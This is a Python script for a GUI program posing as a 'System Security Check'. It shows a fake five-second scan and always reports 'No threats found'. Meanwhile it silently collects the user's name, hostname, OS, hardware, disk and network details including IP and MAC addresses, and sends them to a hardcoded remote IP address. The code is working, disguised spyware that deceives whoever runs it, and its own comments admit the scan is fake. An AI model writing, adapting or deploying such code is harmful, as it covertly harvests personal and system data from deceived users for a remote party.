# client_agent.py
# GUI client: shows "System security check" with a 5s loading,
# sends system info to server, then shows "No viruses found" until user closes.

import os
import platform
import socket
import psutil
import datetime
import getpass
import requests
import json
import traceback
import threading
import time
import tkinter as tk
from tkinter import ttk, messagebox

# ====== CONFIG ======
SERVER_URL = "http://26.244.196.115:8443/collect"  # <-- replace with server IP
API_KEY = "b7f9d2a3-4e6c-41f2-9a8e-5c3d7f0b2e1c"           # <-- same as server
TIMEOUT = 10
FAKE_SCAN_SECONDS = 5
# ====================

def bytes_to_gb(b): return round(b / (1024**3), 2)

def collect_system_info():
    info = {}
    try: info["user"] = getpass.getuser()
    except: info["user"] = None
    try: info["computer"] = socket.gethostname()
    except: info["computer"] = None
    try: info["os"] = platform.platform()
    except: info["os"] = None

    try:
        mem = psutil.virtual_memory()
        info["memory_total_gb"] = bytes_to_gb(mem.total)
        info["memory_used_gb"] = bytes_to_gb(mem.used)
        info["memory_percent"] = mem.percent
    except: pass

    try:
        info["cpu_model"] = platform.processor()
        info["cpu_physical_cores"] = psutil.cpu_count(logical=False)
        info["cpu_logical_cores"] = psutil.cpu_count(logical=True)
    except: pass

    try:
        disks = []
        for p in psutil.disk_partitions():
            try:
                u = psutil.disk_usage(p.mountpoint)
                disks.append({
                    "device": p.device,
                    "fstype": p.fstype,
                    "total_gb": bytes_to_gb(u.total),
                    "used_gb": bytes_to_gb(u.used),
                    "percent": u.percent
                })
            except: continue
        info["disks"] = disks
    except: pass

    try:
        nics = {}
        for nic, addrs in psutil.net_if_addrs().items():
            nic_entry = {}
            for a in addrs:
                if a.family == socket.AF_INET:
                    nic_entry["ipv4"] = a.address
                if hasattr(psutil, "AF_LINK") and a.family == psutil.AF_LINK:
                    nic_entry["mac"] = a.address
            if nic_entry:
                nics[nic] = nic_entry
        info["nics"] = nics
    except: pass

    try:
        boot_ts = psutil.boot_time()
        info["uptime_seconds"] = int(datetime.datetime.now().timestamp() - boot_ts)
    except: pass

    info["collected_at_utc"] = datetime.datetime.utcnow().isoformat() + "Z"
    return info

def send_to_server(info):
    payload = {"api_key": API_KEY, "info": info}
    try:
        r = requests.post(SERVER_URL, json=payload, timeout=TIMEOUT)
        r.raise_for_status()
        return True, r.json()
    except Exception as e:
        return False, str(e)

class ClientGUI(tk.Tk):
    def __init__(self):
        super().__init__()
        self.title("System Security Check")
        self.geometry("520x240")
        self.resizable(False, False)

        self.lbl_title = ttk.Label(self, text="Performing system security check...", font=("Segoe UI", 14))
        self.lbl_title.pack(pady=(18, 6))

        self.pb = ttk.Progressbar(self, orient="horizontal", length=440, mode="indeterminate")
        self.pb.pack(pady=8)
        self.pb.start(12)

        self.lbl_status = ttk.Label(self, text="Please wait while the system is scanned...", foreground="#555")
        self.lbl_status.pack(pady=(6, 12))

        self.btn_close = ttk.Button(self, text="Close", command=self.on_close, state="disabled")
        self.btn_close.pack(pady=(8, 8))

        # flags
        self.sent_ok = None
        self.result_text = ""

        # start background tasks
        threading.Thread(target=self._fake_scan, daemon=True).start()
        threading.Thread(target=self._collect_and_send, daemon=True).start()

    def _fake_scan(self):
        time.sleep(FAKE_SCAN_SECONDS)
        # After 5 seconds, update UI (final result depends on send state)
        self.after(0, self._show_result)

    def _collect_and_send(self):
        try:
            info = collect_system_info()
            ok, resp = send_to_server(info)
            self.sent_ok = ok
            if ok:
                self.result_text = "No threats found.\nReport sent successfully."
            else:
                self.result_text = "No threats found.\nBut sending report failed.\n" + str(resp)
        except Exception as e:
            self.sent_ok = False
            self.result_text = "No threats found.\nBut an error occurred: " + str(e)

    def _show_result(self):
        self.pb.stop()
        self.lbl_title.configure(text="System check complete")
        if not self.result_text:
            # if send still not finished, show neutral text
            self.result_text = "No threats found.\nSending report..."
        self.lbl_status.configure(text=self.result_text, foreground="#2a7a2a")
        self.btn_close.configure(state="normal")

    def on_close(self):
        self.destroy()

def main():
    try:
        # optional: nicer theme
        try:
            style = ttk.Style()
            if "vista" in style.theme_names():
                style.theme_use("vista")
        except:
            pass

        app = ClientGUI()
        app.mainloop()
    except Exception as e:
        messagebox.showerror("Error", str(e))

if __name__ == "__main__":
    main()
